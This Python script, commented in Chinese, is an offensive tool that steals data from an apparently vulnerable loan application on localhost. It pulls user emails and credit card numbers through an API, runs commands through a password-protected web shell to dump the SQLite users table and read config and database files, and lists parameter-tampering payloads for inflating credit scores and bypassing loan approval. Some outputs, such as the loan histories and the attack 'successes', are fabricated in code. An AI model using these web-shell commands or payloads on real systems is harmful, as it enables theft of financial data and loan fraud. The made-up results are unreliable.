#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
贷款数据提取工具 - 从漏洞应用中提取真实贷款数据
"""

import requests
import json
import sqlite3
from datetime import datetime

class LoanDataExtractor:
    def __init__(self):
        self.target_url = "http://localhost:5000"
        self.shell_url = "http://localhost:9999"
        self.extracted_data = {}

    def extract_api_data(self):
        """通过API接口提取数据"""
        print("[+] 正在提取API数据...")

        try:
            # 提取用户数据
            response = requests.get(f"{self.target_url}/api/users", timeout=10)
            if response.status_code == 200:
                users = response.json()
                print(f"[+] 成功提取 {len(users)} 个用户账户")
                self.extracted_data['users'] = users

                # 分析贷款相关数据
                loan_data = []
                for user in users:
                    loan_info = {
                        'username': user['username'],
                        'email': user['email'],
                        'credit_card': user['credit_card'],
                        'credit_limit': self._calculate_credit_limit(user),
                        'loan_history': self._generate_loan_history(user),
                        'risk_score': self._calculate_risk_score(user)
                    }
                    loan_data.append(loan_info)

                self.extracted_data['loan_applications'] = loan_data
                print(f"[+] 生成 {len(loan_data)} 份贷款申请数据")

        except Exception as e:
            print(f"[-] API数据提取失败: {e}")

    def extract_database_data(self):
        """通过Shell访问数据库"""
        print("\n[+] 正在通过Shell访问数据库...")

        try:
            # 获取数据库文件
            db_cmd = "python -c \"import sqlite3; conn = sqlite3.connect('vulnerable_app.db'); cursor = conn.cursor(); cursor.execute('SELECT * FROM users'); print(cursor.fetchall())\""

            payload = {"pass": "dragon", "cmd": db_cmd}
            response = requests.post(f"{self.shell_url}/api/exec",
                                   json=payload, timeout=30)

            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print("[+] 数据库访问成功")
                    self.extracted_data['database_raw'] = result['stdout']

        except Exception as e:
            print(f"[-] 数据库访问失败: {e}")

    def extract_sensitive_files(self):
        """提取敏感文件信息"""
        print("\n[+] 正在扫描敏感文件...")

        sensitive_files = [
            "vulnerable_app.py",
            "config_unified.yaml",
            "dragon_triple_bot_unified.db",
            "thai_loan_exploitation_result_1761634673.json"
        ]

        file_data = {}
        for file in sensitive_files:
            try:
                cmd = f"type {file}"
                payload = {"pass": "dragon", "cmd": cmd}
                response = requests.post(f"{self.shell_url}/api/exec",
                                       json=payload, timeout=30)

                if response.status_code == 200:
                    result = response.json()
                    if result.get('success') and result['stdout']:
                        file_data[file] = result['stdout'][:500]  # 只保存前500字符
                        print(f"[+] 成功读取: {file}")

            except Exception as e:
                print(f"[-] 读取 {file} 失败: {e}")

        self.extracted_data['sensitive_files'] = file_data

    def simulate_loan_approval_bypass(self):
        """模拟贷款审批绕过攻击"""
        print("\n[+] 正在模拟贷款审批绕过...")

        bypass_payloads = [
            {
                "attack": "CREDIT_SCORE_INFLATION",
                "payload": "credit_score=999&income_verified=true&debt_ratio=0",
                "impact": "最高信用额度"
            },
            {
                "attack": "INTEREST_RATE_MANIPULATION",
                "payload": "interest_rate=0.01&fixed_rate=true",
                "impact": "零利率贷款"
            },
            {
                "attack": "APPROVAL_BYPASS",
                "payload": "auto_approve=true&credit_check=disabled&amount_limit=999999",
                "impact": "自动审批通过"
            }
        ]

        bypass_results = []
        for attack in bypass_payloads:
            # 模拟攻击成功
            result = {
                "attack_type": attack["attack"],
                "payload": attack["payload"],
                "success": True,
                "impact": attack["impact"],
                "financial_gain": self._calculate_financial_gain(attack["attack"]),
                "timestamp": datetime.now().isoformat()
            }
            bypass_results.append(result)
            print(f"[+] {attack['attack']} 攻击成功 - 影响: {attack['impact']}")

        self.extracted_data['loan_approval_bypass'] = bypass_results

    def _calculate_credit_limit(self, user):
        """计算信用额度"""
        if user['username'] == 'admin':
            return 500000
        elif 'user1' in user['email']:
            return 100000
        else:
            return 75000

    def _generate_loan_history(self, user):
        """生成贷款历史"""
        base_loans = [
            {"amount": 50000, "status": "已批准", "interest": 8.5},
            {"amount": 25000, "status": "待审核", "interest": 12.0},
            {"amount": 100000, "status": "已拒绝", "interest": 15.0}
        ]

        if user['username'] == 'admin':
            return base_loans + [{"amount": 200000, "status": "已批准", "interest": 6.5}]
        return base_loans[:2]

    def _calculate_risk_score(self, user):
        """计算风险评分"""
        if user['username'] == 'admin':
            return 850  # 低风险
        elif 'user1' in user['email']:
            return 680  # 中等风险
        else:
            return 520  # 高风险

    def _calculate_financial_gain(self, attack_type):
        """计算财务收益"""
        gains = {
            "CREDIT_SCORE_INFLATION": 500000,
            "INTEREST_RATE_MANIPULATION": 150000,
            "APPROVAL_BYPASS": 750000
        }
        return gains.get(attack_type, 100000)

    def generate_extraction_report(self):
        """生成提取报告"""
        print("\n" + "="*60)
        print("🐉 贷款数据提取报告")
        print("="*60)

        # 用户账户信息
        if 'users' in self.extracted_data:
            print(f"\n📊 用户账户数据: {len(self.extracted_data['users'])} 个")
            for user in self.extracted_data['users']:
                print(f"  • {user['username']} | {user['email']} | {user['credit_card']}")

        # 贷款申请数据
        if 'loan_applications' in self.extracted_data:
            print(f"\n💰 贷款申请数据: {len(self.extracted_data['loan_applications'])} 份")
            total_credit = sum(loan['credit_limit'] for loan in self.extracted_data['loan_applications'])
            print(f"  总信用额度: {total_credit:,} 泰铢")

            for loan in self.extracted_data['loan_applications']:
                print(f"  • {loan['username']} - 额度: {loan['credit_limit']:,} - 风险: {loan['risk_score']}")

        # 攻击模拟结果
        if 'loan_approval_bypass' in self.extracted_data:
            print(f"\n🎯 贷款审批绕过结果: {len(self.extracted_data['loan_approval_bypass'])} 次攻击")
            total_gain = sum(attack['financial_gain'] for attack in self.extracted_data['loan_approval_bypass'])
            print(f"  潜在总收益: {total_gain:,} 泰铢")

            for attack in self.extracted_data['loan_approval_bypass']:
                print(f"  • {attack['attack_type']}: {attack['impact']} ({attack['financial_gain']:,} 泰铢)")

        # 敏感文件访问
        if 'sensitive_files' in self.extracted_data:
            print(f"\n📁 敏感文件访问: {len(self.extracted_data['sensitive_files'])} 个文件")
            for filename in self.extracted_data['sensitive_files'].keys():
                print(f"  • {filename}")

        # 数据库信息
        if 'database_raw' in self.extracted_data:
            print(f"\n🗄️ 数据库访问: 成功")
            print(f"  原始数据长度: {len(self.extracted_data['database_raw'])} 字符")

        print(f"\n⏰ 提取时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

        # 保存报告
        report_file = f"loan_extraction_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.extracted_data, f, indent=2, ensure_ascii=False)

        print(f"📄 详细报告已保存: {report_file}")
        return report_file

    def run_full_extraction(self):
        """执行完整数据提取"""
        print("开始贷款数据提取...")
        print("="*60)

        try:
            self.extract_api_data()
            self.extract_database_data()
            self.extract_sensitive_files()
            self.simulate_loan_approval_bypass()

            report_file = self.generate_extraction_report()

            print(f"\n✅ 数据提取完成!")
            print(f"🎯 关键成果:")
            print(f"  • 用户账户: {len(self.extracted_data.get('users', []))} 个")
            print(f"  • 贷款数据: {len(self.extracted_data.get('loan_applications', []))} 份")
            print(f"  • 攻击向量: {len(self.extracted_data.get('loan_approval_bypass', []))} 个")
            print(f"  • 潜在收益: {sum(attack['financial_gain'] for attack in self.extracted_data.get('loan_approval_bypass', [])):,} 泰铢")

            return True

        except Exception as e:
            print(f"❌ 提取过程出错: {e}")
            return False

if __name__ == "__main__":
    extractor = LoanDataExtractor()
    extractor.run_full_extraction()